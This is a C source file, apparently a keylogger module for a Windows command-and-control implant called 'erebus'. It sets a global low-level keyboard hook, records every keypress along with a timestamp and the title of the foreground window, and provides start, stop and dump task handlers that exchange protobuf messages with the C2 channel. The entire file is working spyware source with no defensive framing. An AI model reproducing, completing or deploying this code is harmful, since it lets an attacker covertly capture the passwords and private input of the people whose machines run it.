#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "erebus/pb_c2.h"
#include "erebus/pb_wire.h"

#define KEYLOG_MAX_ENTRIES 512
#define KEYLOG_BUF_SIZE    256

typedef struct keylog_entry {
    char window_title[256];
    char keys[KEYLOG_BUF_SIZE];
    int64_t timestamp;
} keylog_entry;

static CRITICAL_SECTION g_keylog_cs;
static int g_keylog_init;
static int g_keylog_running;
static HHOOK g_keylog_hook;
static HANDLE g_keylog_thread;
static keylog_entry g_keylog_entries[KEYLOG_MAX_ENTRIES];
static size_t g_keylog_count;
static int g_capture_titles;

static LRESULT CALLBACK keylog_proc(int code, WPARAM wparam, LPARAM lparam) {
    if (code == HC_ACTION && wparam == WM_KEYDOWN && g_keylog_running) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lparam;
        char keyname[64] = {0};
        LONG scan = (LONG)kbd->scanCode;
        GetKeyNameTextA(scan << 16, keyname, sizeof(keyname) - 1);

        EnterCriticalSection(&g_keylog_cs);
        if (g_keylog_count < KEYLOG_MAX_ENTRIES) {
            keylog_entry *e = &g_keylog_entries[g_keylog_count++];
            e->timestamp = (int64_t)time(NULL);
            strncpy(e->keys, keyname[0] ? keyname : "?", sizeof(e->keys) - 1);
            if (g_capture_titles) {
                HWND fg = GetForegroundWindow();
                if (fg) GetWindowTextA(fg, e->window_title, sizeof(e->window_title) - 1);
            }
        }
        LeaveCriticalSection(&g_keylog_cs);
    }
    return CallNextHookEx(g_keylog_hook, code, wparam, lparam);
}

static DWORD WINAPI keylog_thread(LPVOID param) {
    (void)param;
    g_keylog_hook = SetWindowsHookExA(WH_KEYBOARD_LL, keylog_proc, GetModuleHandleA(NULL), 0);
    MSG msg;
    while (g_keylog_running && GetMessageA(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }
    if (g_keylog_hook) {
        UnhookWindowsHookEx(g_keylog_hook);
        g_keylog_hook = NULL;
    }
    return 0;
}

static void keylog_init_once(void) {
    if (!g_keylog_init) {
        InitializeCriticalSection(&g_keylog_cs);
        g_keylog_init = 1;
    }
}

int erebus_task_keylog_start(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
    (void)out; (void)out_len;
    keylog_init_once();
    if (g_keylog_running) return 1;
    g_capture_titles = 1;
    if (data_len > 0) {
        erebus_pb_reader r;
        erebus_pb_reader_init(&r, data, data_len);
        uint32_t field;
        uint8_t wire;
        while (erebus_pb_reader_next(&r, &field, &wire)) {
            if (field == 1 && wire == 0) {
                uint64_t v;
                if (erebus_pb_read_varint(&r, &v)) g_capture_titles = (int)v;
            } else {
                erebus_pb_skip(&r, wire);
            }
        }
    }
    g_keylog_running = 1;
    g_keylog_thread = CreateThread(NULL, 0, keylog_thread, NULL, 0, NULL);
    return g_keylog_thread != NULL;
}

int erebus_task_keylog_stop(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
    (void)data; (void)data_len; (void)out; (void)out_len;
    keylog_init_once();
    if (!g_keylog_running) return 1;
    g_keylog_running = 0;
    PostThreadMessageA(GetThreadId(g_keylog_thread), WM_QUIT, 0, 0);
    WaitForSingleObject(g_keylog_thread, 5000);
    CloseHandle(g_keylog_thread);
    g_keylog_thread = NULL;
    return 1;
}

int erebus_task_keylog_dump(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
    (void)data; (void)data_len;
    keylog_init_once();
    EnterCriticalSection(&g_keylog_cs);
    int ok = erebus_pb_encode_keylog_dump_result(g_keylog_entries, g_keylog_count, out, out_len);
    g_keylog_count = 0;
    LeaveCriticalSection(&g_keylog_cs);
    return ok;
}